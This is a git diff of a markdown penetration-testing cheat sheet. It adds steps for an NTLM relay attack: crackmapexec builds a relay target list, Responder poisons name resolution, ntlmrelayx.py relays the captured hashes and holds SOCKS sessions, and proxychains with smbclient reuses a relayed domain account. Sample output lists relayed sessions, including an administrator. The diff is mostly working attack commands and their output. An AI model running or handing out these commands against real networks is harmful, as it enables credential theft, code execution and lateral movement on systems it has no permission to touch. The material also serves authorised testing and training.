@@ -9,13 +9,37 @@ responder -I eth0 -rdwv
 - The file **/usr/share/responder/Responde.conf** has to be modified:
 
   ![image](https://user-images.githubusercontent.com/43812413/200524235-2253f2c2-9838-46f3-86c3-ac2233869cc9.png)
+- Modify **/etc/proxychains4.conf**
+
+  ![image](https://user-images.githubusercontent.com/43812413/200545624-c0ce95be-be26-40ee-a35d-19c6e371d8fb.png)
+
 - Once we have modified the file we will start **responder** and **ntlmrelayx.py** in order to relay the hashes to targets:
   ```bash
+  cme smb <networkIP>/<cidr> --gen-relay-list relayTargets.txt
+  
   python Responder.py -l tun0 -rdw
   
-  python ntlmrelayx.py -tf targets.txt -smb2support
+  python ntlmrelayx.py -tf relayTargets.txt -socks -smb2support
   ```
-- If the attack is successful, we will gain code execution.
+  - If the attack is successful, we will gain code execution.
+  - View active socks
+    ```bash
+    ntlmrelayx> socks
+    Protocol  Target          Username                  Port
+    --------  --------------  ------------------------  ----
+    SMB       192.168.48.38   VULNERABLE/NORMALUSER3    445
+    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
+    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
+    SMB       192.168.48.230  VULNERABLE/ADMINISTRATOR  445
+    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
+    SMTP      192.168.48.224  VULNERABLE/NORMALUSER3    25
+    SMTP      192.168.48.224  CONTOSO/NORMALUSER1       25
+    IMAP      192.168.48.224  CONTOSO/NORMALUSER1       143
+    ```
+  - Using SOCK
+    ```bash
+    proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
+    ```
 # Enumeration
 - Enumerate all local accounts
 ```bat
